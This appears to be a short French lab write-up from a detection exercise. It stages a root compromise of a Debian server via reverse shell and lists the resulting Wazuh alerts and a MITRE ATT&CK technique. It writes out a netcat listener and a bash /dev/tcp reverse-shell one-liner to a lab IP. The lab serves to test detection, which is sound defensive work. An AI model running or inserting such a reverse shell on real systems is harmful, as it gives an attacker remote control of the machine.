# Cas d’usage : Reverse Shell → Compromission root

Ce cas d’usage simule une compromission complète d’un serveur Debian via un reverse shell.

## Commande sur Kali (attacker)

nc -lvnp 4444

## Commande sur Debian compromis

bash -i >& /dev/tcp/192.168.100.12/4444 0>&1

## Résultat

- Shell root obtenu  
- Contrôle total de la machine compromise
<img width="753" height="303" alt="image" src="https://github.com/user-attachments/assets/f6366b65-342b-45f1-850d-4f78c025901c" />

## Alertes Wazuh

- Activité shell suspecte  
- Exécution de commandes  
- Connexion réseau inhabituelle
<img width="1368" height="736" alt="image" src="https://github.com/user-attachments/assets/000948c6-101f-44ac-8546-59420f64c8d8" />

## MITRE ATT&CK

- T1059 – Command Execution
